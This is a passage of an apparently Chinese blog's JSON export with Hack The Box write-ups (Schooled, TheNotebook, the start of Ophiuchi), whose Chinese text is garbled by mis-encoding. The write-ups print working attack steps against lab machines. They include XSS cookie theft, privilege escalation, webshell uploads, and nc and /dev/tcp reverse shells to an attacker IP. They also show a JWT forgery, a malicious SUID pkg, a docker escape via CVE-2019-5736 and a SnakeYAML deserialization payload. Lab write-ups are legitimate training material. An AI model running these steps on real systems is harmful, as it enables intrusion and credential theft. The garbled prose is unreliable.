ä½†å´æ˜¯ä¸€ä¸ªåå°„å‹xssï¼ˆå›½å†…æŸå¹³å°éƒ½ä¸æ”¶çš„åƒåœ¾æ´ï¼Œåæ§½ä¸€ä¸‹ï¼‰ï¼Œä½†æ˜¯å’±ä»¬è¯æ˜äº†è¯¥ç½‘ç«™æ˜¯å­˜åœ¨XSSçš„ã€‚ç»“åˆæˆ‘ä»¬ä¹‹å‰çš„çŒœæµ‹ï¼Œåº”è¯¥æ˜¯åœ¨MoodleNetå¤„æ’å…¥xss æ¼æ´åˆ©ç”¨ https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md è¿™æ˜¯æˆ‘ä½¿ç”¨çš„xss cookieè„šæœ¬ï¼Œå¤§å®¶æœ‰ä¹ æƒ¯ä½¿ç”¨çš„ä¹Ÿå¯ä»¥ç”¨è‡ªå·±çš„ å’±ä»¬ä¿®æ”¹å¥½è„šæœ¬åä½¿ç”¨pythonå¯åŠ¨ image ç„¶ååœ¨MoodleNetå¤„æ’å…¥æˆ‘ä»¬çš„xssä»£ç  å’±ä»¬æ’å…¥åä¿å­˜ï¼Œå¯ä»¥çœ‹åˆ°è‡ªå·±çš„cookieå·²ç»è¿‡æ¥äº†ï¼Œå’±ä»¬æŒ‚ç€å»å¬ä¼šå„¿éŸ³ä¹ï¼Œè€å¸ˆçš„cookieå°±è¿‡æ¥ å¥½äº†ï¼Œå’±ä»¬å·²ç»æˆåŠŸé’“åˆ°è€å¸ˆçš„cookieäº† å°†å’±ä»¬çš„cookieæ›¿æ¢ä¸ºè€å¸ˆçš„cookie ç„¶ååˆ·æ–° å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»æˆåŠŸè¿›å…¥è€å¸ˆçš„æƒé™äº† https://moodle.org/mod/forum/discuss.php?d=407393 æˆ‘ä»¬åœ¨æŸ¥æ‰¾æ¼æ´çš„æ—¶å€™ï¼Œå‘ç°äº†è¿™ä¸ªCVE-2020-14321ã€‚ è¯¾ç¨‹ä¸­çš„æ•™å¸ˆå¯ä»¥æŠŠè‡ªå·±çš„èº«ä»½æ›´æ”¹ä¸ºç»ç†ï¼Œä¹Ÿå°±æ˜¯è¶Šæƒ ç°åœ¨æˆ‘ä»¬æ¥è¿›è¡Œåˆä¸€æ¬¡çš„è¶Šæƒå§ éšä¾¿é€‰æ‹©ä¸€ä¸ªäººï¼Œç„¶åæŠ“åŒ…ï¼Œç„¶åæäº¤ æˆåŠŸæŠ“åˆ°åŒ…äº† å’±ä»¬åœ¨ä»‹ç»é¡µé¢ï¼Œå‘ç°Lianne Carteræ˜¯ä¸€åç»ç†ï¼ŒOK é‚£å°±è¶Šå¥¹ userlistæ”¹ä¸º24ï¼Œå› ä¸ºå’±ä»¬ä¹Ÿæ˜¯è¶Šæƒåˆ°è€å¸ˆçš„è´¦å·ï¼Œæ‰€ä»¥è¦ä¿®æ”¹ä¸ºè€å¸ˆçš„IDï¼Œè€Œ24å°±æ˜¯è€å¸ˆçš„IDï¼Œroletoassignå¤„æ˜¯è®°å½•çš„æƒé™ï¼Œ1ä¸ºç»ç†ï¼Œå’±ä»¬ä¿®æ”¹ä¸º1ä»¥åç‚¹å‡»send åˆ·æ–°ä»¥åï¼Œå’±ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæƒé™å·²ç»å˜æˆäº†ç»ç† ç„¶åæŠŠLianne Carteræ·»åŠ åˆ°å­¦ç”Ÿé‡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½çœ‹åˆ° Lianne Carteräº†ã€‚ æˆ‘ä¹‹å‰å°±æ˜¯æ²¡æ·»åŠ ï¼Œåœ¨è¿™å¡äº†å¥½ä¹…ï¼Œé¶æœºé‡ç½®äº†ä¸‰æ¬¡ å’±ä»¬ç‚¹å‡»Lianne Carterå¹¶ç™»å…¥è¯¥è´¦å· å’±ä»¬ç‚¹å‡»ç™»å½• ç„¶åå’±ä»¬åœ¨æœ€åº•ä¸‹å¯ä»¥çœ‹åˆ°site administration å’±ä»¬ç‚¹å‡» æ¥ä¸‹æ¥å’±ä»¬æŒ‰ç…§RCEé‡Œçš„å¥—è·¯è·Ÿç€èµ°å°±è¡Œ å’±ä»¬åœ¨ç‚¹save changesä¹‹å‰ï¼Œè®°å¾—æŠ“åŒ… ç„¶åæ›¿æ¢RCEé‡Œçš„åŒ… çœ‹æ¥RCEæ‰§è¡ŒæˆåŠŸäº† ä¸Šä¼ å’±ä»¬çš„EXP è®¿é—®http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block\\_rce.php?cmd=id æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªwebshell æœ¬åœ°ä½¿ç”¨ncç›‘å¬ç«¯å£ nc -nvlp 4444 æ‰§è¡Œncåå¼¹shell rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i |nc 10.10.14.184 4444 &gt; &#x2F;tmp&#x2F;f http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd&#x3D;rm%20&#x2F;tmp&#x2F;f;mkfifo%20&#x2F;tmp&#x2F;f;cat%20&#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh%20-i%20|nc%2010.10.14.184%204444%20%3E%20&#x2F;tmp&#x2F;f æˆåŠŸä½¿ç”¨ncåå¼¹shell æƒé™æå‡ å’±ä»¬ä½¿ç”¨pwdæŸ¥çœ‹ä¸€ä¸‹å½“å‰ä½ç½®ï¼Œå‘ç°æ˜¯åœ¨apacheç›®å½•ä¸‹ ä¹Ÿå°±æ˜¯è¯´ï¼Œå’±ä»¬æ‹¥æœ‰apacheç›®å½•çš„æƒé™ é‚£å°±ç›´æ¥è¯»å–apacheçš„é…ç½®æ–‡ä»¶å§ é¦–å…ˆæŸ¥æ‰¾é…ç½®æ–‡ä»¶åœ°å€ find &#x2F; -name â€œconfig.phpâ€ 2&gt;dev&#x2F;null cat &#x2F;usr&#x2F;local&#x2F;www&#x2F;apache24&#x2F;data&#x2F;moodel&#x2F;config.php ç„¶åä½¿ç”¨catæŸ¥çœ‹é…ç½®æ–‡ä»¶ æˆ‘å‘ç°è¿™ä¹ˆåšå¥½åƒæœ‰ä¸€ç‚¹é—®é¢˜ï¼Œå’±ä»¬å»ä¿®æ”¹ä¸€ä¸‹RCE https://github.com/LucifielHack/phpbash å’±ä»¬å°†é‡Œé¢çš„ä¸€å¥è¯æœ¨é©¬ä¿®æ”¹ä¸ºphpbash æˆåŠŸå¾—åˆ°è´¦å·å¯†ç  dbname &#x3D; model dbuser &#x3D; model dbpass &#x3D; PlaybookMaster2020 æˆ‘æƒ³ä½¿ç”¨mysqlè¿›è¡Œç™»å½•ï¼Œä½†è¾“å…¥mysqlåå‘ç°æ— æ³•ä½¿ç”¨ï¼Ÿ ä½†ä¸Šé¢å·²ç»çœ‹åˆ°äº†ï¼Œä½¿ç”¨äº†mysqliè¿›è¡Œè¿æ¥ï¼Œé‚£å°±è‚¯å®šæ˜¯å­˜åœ¨mysqlçš„ã€‚ ä½†æ˜¯ä¸ºä»€ä¹ˆæ— æ³•ä½¿ç”¨å‘¢ï¼Ÿæˆ‘æƒ³åº”è¯¥æ˜¯pathé‡Œæ²¡æœ‰é…ç½®ï¼Œå’±ä»¬ä½¿ç”¨exportæŸ¥çœ‹ä¸€ä¸‹ æœç„¶æ²¡æœ‰ ç„¶åæˆ‘æ‰¾äº†ä¸€ä¸‹mysqlçš„è·¯å¾„ï¼Œå’±ä»¬ä½¿ç”¨ç»å¯¹è·¯å¾„æ¥è¿›è¡Œè¯»å– &#x2F;usr&#x2F;local&#x2F;bin&#x2F;mysql -u moodle -pPlaybookMaster2020 -e â€œuse moodle;select * from mdl_user\\Gâ€ $2y$10$3D&#x2F;gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW å…¶ä¸­å’±ä»¬éœ€è¦å…³æ³¨çš„æ˜¯Jamieçš„å¯†ç hashï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºåœ¨&#x2F;etc&#x2F;passwdé‡Œä¹Ÿæœ‰ä»– æ—¢ç„¶å’±ä»¬æ‹¿åˆ°ä¸€ä¸ªhashäº†ï¼Œé‚£ä¹ˆå°±è¯·å‡ºå’±ä»¬çš„è€æœ‹å‹ john çˆ†ç ´æˆåŠŸ å¯†ç ä¸º !QAZ2wsx å’±ä»¬å»ç™»å½• ssh jamie@10.10.10.234 æˆåŠŸç™»å½• æˆåŠŸæ‹¿åˆ°useræƒé™flag å’±ä»¬ä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹sudoæƒé™ å¯ä»¥sudoæƒé™å®‰è£…pkgåŒ… é‚£ä¸ç”¨è¯´ï¼Œææƒæ€è·¯è‚¯å®šåœ¨è¿™äº† http://lastsummer.de/creating-custom-packages-on-freebsd/ æ‰¾åˆ°ä¸€ç¯‡å‚è€ƒæ–‡ç« ï¼Œæ¥ä¸‹æ¥å’±ä»¬æ„é€ EXPåŒ… #!&#x2F;bin&#x2F;sh STAGEDIR&#x3D;~&#x2F;stage rm -rf ${STAGEDIR} mkdir -p ${STAGEDIR} cat &gt;&gt; ${STAGEDIR}&#x2F;+PRE_DEINSTALL &lt;&lt;EOF careful here, this may clobber your systemecho â€œResetting root shellâ€ pw usermod -n root -s &#x2F;bin&#x2F;sh EOF cat &gt;&gt; ${STAGEDIR}&#x2F;+POST_INSTALL &lt;&lt;EOF careful here, this may clobber your systemecho â€œRegistering root shellâ€ chmod +s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;bash EOF cat &gt;&gt; ${STAGEDIR}&#x2F;+MANIFEST &lt;&lt;EOF name: mypackage version: â€œ1.0_5â€ origin: sysutils&#x2F;mypackage comment: â€œautomates stuffâ€ desc: â€œautomates tasks which can also be undone laterâ€ maintainer: &#106;&#x6f;&#104;&#x6e;&#x40;&#x64;&#111;&#x65;&#x2e;&#105;&#116; www: https://doe.it prefix: &#x2F; EOF mkdir -p ${STAGEDIR}&#x2F;usr&#x2F;local&#x2F;etc echo â€œ# hello worldâ€ &gt; ${STAGEDIR}&#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.conf echo â€œ&#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.confâ€ &gt; ${STAGEDIR}&#x2F;plist pkg create -m ${STAGEDIR}&#x2F; -r${STAGEDIR}&#x2F; -p ${STAGEDIR}&#x2F;plist -o . python3 -m http.server 80 åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªhttpæœåŠ¡ ç„¶ååœ¨æœåŠ¡å™¨ä¸Šç”¨wgetä¸‹ã€‚ã€‚ã€‚ å—¯ï¼Ÿå§æ§½ï¼Ÿå¤±ç­–äº†ï¼Œå±…ç„¶æ²¡æœ‰wget æµ‹è¯•äº†ä¸€ä¸‹ï¼Œvimä¹Ÿæ²¡æœ‰ï¼Œä½†æ˜¯æœ‰viå’Œnano çœ‹å¤§å®¶å–œæ¬¢ç”¨é‚£ä¸ªï¼Œåæ­£ç›´æ¥åˆ›å»ºå°±å¥½äº† åˆ›å»ºå¥½åè®°å¾—æ·»åŠ æ‰§è¡Œæƒé™ chmod +x exploit.sh ç„¶åæˆ‘ä»¬å®‰è£…å®ƒ sudo &#x2F;usr&#x2F;sbin&#x2F;pkg install â€“no-repo-update mypackage-1.0_5.txz ç„¶åå’±ä»¬ä½¿ç”¨SUIDæ¥æ”»å‡» bash -p æˆåŠŸææƒåˆ°root æˆåŠŸè·å¾—rootæƒé™çš„flag æ”¶å·¥ç¡è§‰","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"TheNotebook - Hackthebox","slug":"Hackthebox - TheNotebook","date":"2021-06-03T11:38:36.000Z","updated":"2023-05-20T03:17:06.000Z","comments":true,"path":"2021/06/03/Hackthebox - TheNotebook/","link":"","permalink":"http://www.lucifiel.com/2021/06/03/Hackthebox%20-%20TheNotebook/","excerpt":"","text":"Hackthebox - TheNotebooké¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›† é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ nmap -A -sS -sC -sV 10.10.10.230 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä¸€å…±æœ‰ä¸‰ä¸ªç«¯å£22 80 10010ï¼Œå…¶ä¸­10010ç›®å‰æ˜¯å…³é—­çŠ¶æ€ï¼Œæ‰€ä»¥å’±ä»¬çš„çªç ´å£è¿˜æ˜¯åœ¨80ç«¯å£ è¿›å»ååªæœ‰ä¸‰ä¸ªæŒ‰é’® Homeã€Registerã€Login Homeå°±æ˜¯ä¸»é¡µï¼Œæ‰€ä»¥å’±ä»¬å…ˆåˆ›å»ºä¸€ä¸ªè´¦å·è¯•è¯• æ³¨å†Œäº†ä¸€ä¸ªåä¸ºLucifielçš„è´¦å·ï¼Œæç¤ºæˆ‘ä»¬åœ¨&#x2F;notesä¸‹å¯ä»¥æŸ¥çœ‹åˆ°ç¬”è®°ï¼Œå’±ä»¬å…ˆå»çœ‹çœ‹ ç›®å‰æ²¡æœ‰ç¬”è®°ï¼Œé‚£å°±åˆ›å»ºä¸€ä¸ªçœ‹çœ‹å§ å—¯ã€‚ã€‚ã€‚æš‚æ—¶æ²¡ä»€ä¹ˆå¯åˆ©ç”¨çš„ï¼Œå’±ä»¬æ¥çœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°ç®¡ç†å‘˜è´¦å·å§ å…ˆé€€å‡ºç™»å½•ï¼Œç„¶åç™»å½•çš„æ—¶å€™å’±ä»¬æµ‹è¯•ä¸€ä¸‹ è´¦å·admin æç¤ºå¯†ç é”™è¯¯ è´¦å·admin1 æç¤ºè´¦æˆ·ä¸å­˜åœ¨ å—¯ã€‚ã€‚ã€‚ç¡®å®šäº†adminè´¦æˆ·å­˜åœ¨ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨top1000è¿›è¡Œçˆ†ç ´åï¼Œå¹¶æ²¡æœ‰çˆ†ç ´å‡ºå¯†ç  æ¼æ´åˆ©ç”¨ å’±ä»¬ç™»å…¥åˆšæ‰æ³¨å†Œçš„Lucifielè´¦å·ï¼Œç„¶åçœ‹çœ‹cookie å’±ä»¬å¯ä»¥çœ‹åˆ°authä¸‹æœ‰ä¸‰æ®µbase64çš„å­—æ®µ å’±ä»¬ä½¿ç”¨CyberChefè¿›è¡Œè§£å¯†ï¼Œä¼šå‘ç°ç¬¬ä¸‰æ®µæ˜¯ä¹±ç ï¼Œå’±ä»¬å°±è§£å¯†å‰ä¸¤æ®µå°±å¥½äº† {â€œtypâ€:â€JWTâ€,â€algâ€:â€RS256â€,â€kidâ€:â€http://localhost:7070/privKey.key&quot;} {â€œusernameâ€:â€Lucifielâ€,â€emailâ€:â€&#x4c;&#x75;&#x63;&#105;&#102;&#x69;&#x65;&#108;&#64;&#x65;&#x6d;&#x61;&#105;&#108;&#x2e;&#x63;&#111;&#x6d;â€œ,â€admin_capâ€:false} è§£å¯†å‡ºæ¥çš„å†…å®¹ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œä¸Šé¢æœ‰ä¸€ä¸ªJWTï¼Œæˆ‘æ„Ÿè§‰è¿™æ˜¯çªç ´å£ https://jwt.io/introduction ç›´æ¥æœç´¢JWT æ‰¾åˆ°äº†ä¸€ä¸ªå®˜ç½‘å¹¶ä¸”æœ‰ç›¸å…³çš„ä»‹ç»ï¼Œæˆ‘ä»¬å‘ç°JWTæ˜¯ä¸€ä¸ªJSON ç½‘ç»œä»¤ç‰Œ JWTæ ¼å¼ headers.payload.signature è¿™å°±æ˜¯å’±ä»¬çš„çªç ´å£äº†ï¼Œå¯ç®—æ˜¯æ‰¾åˆ°äº† æ¼æ´åˆ©ç”¨ ç”±äºHeaderså’ŒPayloadæ˜¯æ˜æ–‡å‚¨å­˜çš„ï¼Œæ‰€ä»¥å’±ä»¬å…ˆæŠŠè¿™ä¸¤é¡¹ä¿®æ”¹å¥½ Headers &#x3D; {â€œtypâ€:â€JWTâ€,â€algâ€:â€RS256â€,â€kidâ€:â€http://10.10.14.184/privKey.key&quot;} Payload &#x3D; {â€œusernameâ€:â€Lucifielâ€,â€emailâ€:â€&#x4c;&#x75;&#99;&#x69;&#x66;&#105;&#x65;&#x6c;&#64;&#101;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;â€œ,â€admin_capâ€:1} ä½†æ˜¯è¿™é‡Œçš„signatureä¹Ÿå°±æ˜¯å¯†é’¥å´æ˜¯åŠ å¯†çš„ï¼Œå’±ä»¬æ— æ³•ä¿®æ”¹ä¹Ÿæ— æ³•è¯»å–ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿå½“ç„¶æ˜¯Googleå•¦ https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9 ssh-keygen -t rsa -b 2048 -m PEM -f privKey.key Donâ€™t add passphraseopenssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub cat privKey.key cat privKey.key.pub ç»è¿‡Googleæœç´¢JWTå¯†é’¥çš„ç”Ÿæˆæ”¾å¼ï¼Œå’±ä»¬æ‰¾åˆ°äº†æ‰€éœ€çš„å‘½ä»¤ kalié‡Œç”Ÿæˆ è¿™å°±æ˜¯å’±ä»¬è¦çš„å¯†é’¥äº† -â€”BEGIN PUBLIC KEYâ€”â€“ MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnwiGXuFO1peifvmt2y08 U89mLgcwp+jxcXkp0&#x2F;qURF2N9ZqnIYp&#x2F;Jp6HuGJcqeeoJT&#x2F;DprtAJsCs6hWJ2Fdq nSPGs63Ig6OqGJQK&#x2F;dH2vt6EzQaXqRmkCeN9jwTTPmMr5xklcCtmBAGq8h4NY5LN PcB9GHudFyi8U&#x2F;Ae2f&#x2F;ED8koR&#x2F;AyG1ZdC6SvMv3tjOmkJ5Cax+jbGJMtUGEj4Xfa Na5kJxDSq8F4Z16&#x2F;I+4IO7&#x2F;cfQlVOMNZ09tvEjOAUxjaD8YkueIvyOHeIXhmEY7&#x2F; DF&#x2F;Tkoh7fpRt+9AWEbASZi&#x2F;p2m+DF9Ws&#x2F;K8MyXqNjpWhLrRDpeVLuOLd33V2BQ2w RwIDAQAB -â€”END PUBLIC KEYâ€”â€“ å’±ä»¬å°†headerså’Œpayloadå’Œè¿›è¡Œbase64ï¼Œå¹¶ä¸”ä¿å­˜ä¸ºJWTéœ€è¦çš„æ ¼å¼headers.payload.signature eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xODQvcHJpdktleS5rZXkifQ.eyJ1c2VybmFtZSI6Ikx1Y2lmaWVsIiwiZW1haWwiOiJMdWNpZmllbEBlbWFpbC5jb20iLCJhZG1pbl9jYXAiOjF9.Q0kirAQPuqVJLtkhAa0pkrB11Dy0-tDm-8H9b3HDja7VWPc4mIiupMYzUzxAZamlA1xnUA_x1Btx4N7lcc09GdXZ0o9Ma-q_j-mPu2V-iFJ5hoYSZdL91bjqGMxp-oJ38pSMW4ulJzssuiRa6wl_C-8n9P4i6T0gqvLQjRUr8ksaLoM1WvU4SRjRN6EH_oFY_P9rTGilC2Vt1uogZ0UZGikDmXRXy74rH_-Bvkx8JcFgLgM5D4xPa5ayKFJ-jF-0vazUB8oUeKMr5za1vCbJXSBSNSosQ1MhkacUkEMnOllWNgYilbZR9t1p05vUnaT7ntbsYbILxb6fk4hVU1LyYA è„šæœ¬ï¼š import jwt key &#x3D; open(â€œprivKey.key.pubâ€, â€˜râ€™).read() headers &#x3D; {â€œtypâ€: â€œJWTâ€, â€œalgâ€: â€œRS256â€, â€œkidâ€: â€œhttp://10.10.14.184/privKey.key&quot;} payload &#x3D; {â€œusernameâ€: â€œLucifielâ€, â€œemailâ€: â€œ&#76;&#x75;&#x63;&#105;&#x66;&#x69;&#101;&#108;&#x40;&#x65;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#x6d;â€œ, â€œadmin_capâ€: 1} print(jwt.encode(payload, headers&#x3D;headers, key&#x3D;key, algorithm&#x3D;â€™RS256â€™)) ä½¿ç”¨è¯¥è„šæœ¬å³å¯ç”Ÿæˆæˆ‘ä»¬æ‰€éœ€è¦çš„cookie åœ¨å’±ä»¬æœ¬åœ°ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨ python3 -m http.server 80 ç„¶åä¿®æ”¹10.10.10.230é¶åœºçš„cookieï¼Œç„¶ååˆ·æ–° å’±ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸè¶Šæƒï¼Œç„¶åå‡ºç°äº†ä¸€ä¸ªæŒ‰é’® admin panel å’±ä»¬è®¿é—® å‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç®¡ç†å‘˜åˆ›å»ºäº†ä¸€ä¸ªç¬”è®°ï¼Œæ„æ€æ˜¯å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶ https://github.com/Arrexel/phpbash å’±ä»¬ä¸Šä¼ ä¸€ä¸ªphpé©¬ä¸Šå» æˆåŠŸè·å¾—ä¸€ä¸ªwww-dataæƒé™çš„shell æƒé™æå‡ æˆ‘ä»¬çœ‹ç®¡ç†å‘˜è¯´å­˜åœ¨backupså¤‡ä»½æ–‡ä»¶ å’±ä»¬å†&#x2F;var&#x2F;backups&#x2F;ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªhome.tar.gzæ–‡ä»¶ï¼Œå’±ä»¬åœ¨é¶æœºä¸Šå¼€å¯httpæœåŠ¡æŠŠä»–æä¸‹æ¥ python3 -m http.server 8888 æˆ‘ä»¬æ‰¾åˆ°äº†noahç”¨æˆ·çš„å…¬é’¥å’Œç§é’¥ ç›´æ¥ä½¿ç”¨å¯†é’¥ç™»å½•ï¼ŒæˆåŠŸç™»å½• æˆåŠŸæ‹¿åˆ°useræƒé™çš„flag å’±ä»¬ä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹sudoæƒé™ å‘ç°å¯ä»¥ä½¿ç”¨dockerè¿è¡Œwebapp-dev01è¿™ä¸ªè„šæœ¬ * ä»£è¡¨å¯ä»¥æ¥å—äººå’Œå‚æ•° ç›´æ¥suæˆåŠŸåˆ‡æ¢åˆ°rootç”¨æˆ· sudo &#x2F;usr&#x2F;bin&#x2F;docker exec -it webapp-dev01 sh -c â€œsuâ€ æˆ‘ä»¥ä¸ºäº‹æƒ…åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œæ¯•ç«Ÿå’±ä»¬å·²ç»æ‹¿åˆ°rootæƒé™äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ°flagå°±å¥½äº†ï¼Œä½†æ˜¯åœ¨å¯»æ‰¾flagçš„æ—¶å€™ å‘ç°rootæ–‡ä»¶ä¸ºç©ºï¼Œå†ç»“åˆå’±ä»¬æ‰€å¤„çš„ç¯å¢ƒæ¥è¿›è¡Œåˆ¤æ–­ï¼Œæˆ‘ä¸å¾—ä¸ç›¸ä¿¡ï¼Œæˆ‘ä»¬å±…ç„¶æ˜¯åœ¨ä¸€ä¸ªdockeré‡Œï¼Ÿæ‰€ä»¥ç°åœ¨è¿˜å¾—è¿›è¡Œdockeré€ƒé€¸ï¼Ÿ è¿™ä¸ªé¶åœºï¼Œç¡®å®æœ‰éš¾åº¦çš„å‘€ dockeré€ƒé€¸ https://github.com/Frichetten/CVE-2019-5736-PoC ç»è¿‡æŸ¥è¯¢ï¼Œå‘ç°docker execæ˜¯å­˜åœ¨cveæ¼æ´çš„ å’±ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ var payload &#x3D; â€œ#! &#x2F;bin&#x2F;bash \\n bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.184&#x2F;4444 0&gt;&amp;1â€ å’±ä»¬ä¸‹è½½ä¸‹æ¥åä¿®æ”¹payload ä¿®æ”¹å¥½payloadä»¥åï¼Œå’±ä»¬ä½¿ç”¨golangè¿›è¡Œç¼–è¯‘ ç„¶åä¸Šä¼ åˆ°æœåŠ¡å™¨å†…ï¼Œåœ¨æœ¬åœ°å¼€å¯httpæœåŠ¡ python3 -m http.server 80 åœ¨æœ¬åœ°å¯åŠ¨ncè¿›è¡Œç›‘å¬ ä¸Šä¼ åè¿è¡Œ ç¬¬ä¸€ä¸ªrootæƒé™è¿è¡Œè„šæœ¬ ç¬¬äºŒä¸ªnoahæƒé™è¿è¡ŒæŒ‡ä»¤ æˆåŠŸè·å¾—rootæƒé™ æˆåŠŸå¾—åˆ°rootæƒé™flag æœ€åæ€»ç»“ï¼šè¿™å°æœºå™¨ç¡®å®æŒºæœ‰éš¾åº¦çš„ï¼Œæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡ç¢°åˆ°éœ€è¦è™šæ‹Ÿæœºé€ƒé€¸çš„é¶åœºã€‚è¿™å°æœºå™¨è€—æ—¶ä¸¤å¤©ï¼Œå»æ‰ç¡è§‰å’Œä¼‘æ¯æ—¶é—´è¿˜æœ‰å·¥ä½œæ—¶é—´ï¼Œè€—æ—¶åº”è¯¥è¶…è¿‡10å°æ—¶ï¼Œç¡®å®å¯¹å¾—èµ·è¿™ä¸ªéš¾åº¦ã€‚è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œå­¦åˆ°äº†ä¸å°‘å§¿åŠ¿ï¼Œå…¶ä¸­æœ‰ä¸€äº›ç„å­¦é—®é¢˜ï¼Œè¯·æ•™äº†ä¸å°‘å¤§ä½¬ æ­¤å¤„åœ¨è¿™æ„Ÿè°¢æˆ‘å®å®å¸ˆå‚…@ loid å¯ç®—æ˜¯åšå®Œäº†ï¼Œè¿™ä¸¤å¤©åšçš„å¿«è„‘æº¢è¡€äº†ï¼Œå°±æ˜¯å› ä¸ºä¸€å¤©æ—¶é—´æ²¡æœ‰åšå‡ºæ¥ï¼Œæ‰€ä»¥æ‹–æ›´äº†ä¸€å¤©","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Ophiuchi - Hackthebox","slug":"Hackthebox - Ophiuchi","date":"2021-06-01T11:38:36.000Z","updated":"2023-05-20T02:41:14.000Z","comments":true,"path":"2021/06/01/Hackthebox - Ophiuchi/","link":"","permalink":"http://www.lucifiel.com/2021/06/01/Hackthebox%20-%20Ophiuchi/","excerpt":"","text":"Hackthebox - Ophiuchié¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapé¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ nmap -A -sS -sC -sV 10.10.10.227 Httpæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¼€å¯äº†22å’Œ8080ç«¯å£ï¼Œè®©æˆ‘ä»¬è®¿é—®8080ç«¯å£çœ‹çœ‹ è¿™æ˜¯ä¸ªå•¥ï¼Ÿä¸€ä¸ªYAMLåœ¨çº¿è§£æå™¨ï¼Œè®©æˆ‘ä»¬éšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿è¯•è¯• æ­¤åŠŸèƒ½å·²æš‚åœï¼Œå—¯ã€‚ã€‚ã€‚æœ‰ç‚¹æ„æ€ æˆ‘ä»¬å…ˆçœ‹çœ‹å…¶ä»–åŠŸèƒ½ç‚¹ï¼Œæ¯”å¦‚tomcat ç‰ˆæœ¬ä¸º Apache Tomcat 9.0.38 ç›´æ¥ç™»å½•è¯•è¯•ï¼Œä¸‡ä¸€æœ‰0dayå‘¢ï¼Ÿï¼ˆå¼±å£ä»¤ï¼‰ [http://10.10.10.227:8080/manager](http://10.10.10.227:8080/manager) å’±ä»¬å»ç™»å½•è¯•è¯• æµ‹è¯•äº†å‡ ä¸ªé»˜è®¤å£ä»¤å‡æ— æ•ˆï¼Œçœ‹æ¥è¿˜æ˜¯å¾—æŠŠç›®å…‰æ”¾åˆ°YAMLä¸Šäº†ï¼Œå»googleæ‰¾æ‰¾èµ„æ–™å§ åœ¨æœç´¢è¿‡ç¨‹ä¸­ï¼Œå‘ç°tomcat 9.0.38å­˜åœ¨ Snake yaml ååºåˆ—åŒ–æ¼æ´ YAMLåœ¨çº¿è§£æå™¨å…·æœ‰javaç±»æ„é€ å‡½æ•°çš„åŠŸèƒ½ OKï¼Œé‚£æ€è·¯å°±æœ‰äº† æ¼æ´åˆ©ç”¨ä½¿ç”¨python3åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨ python3 -m http.server 80 ä½¿ç”¨YAMLè§£æå‘½ä»¤ !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&quot;http://10.10.14.184/&quot;] ]] ] ç‚¹å‡»è§£æçœ‹çœ‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æ˜¯å¤±è´¥ï¼Œä½†ç¡®å®&#x2F;META-INF&#x2F;services&#x2F;javax.script.ScriptEngineFactory å‘æˆ‘ä»¬çš„æœºå™¨å‘å‡ºäº†è¯·æ±‚ æˆ‘ä»¬å¯ä»¥ä¿æŒç›¸åŒçš„æ–‡ä»¶ç»“æ„æ¥åˆ©ç”¨å®ƒï¼Œä¾‹å¦‚å…·æœ‰ç›®å½•â€œMETA-INFâ€ç„¶åæ˜¯ services 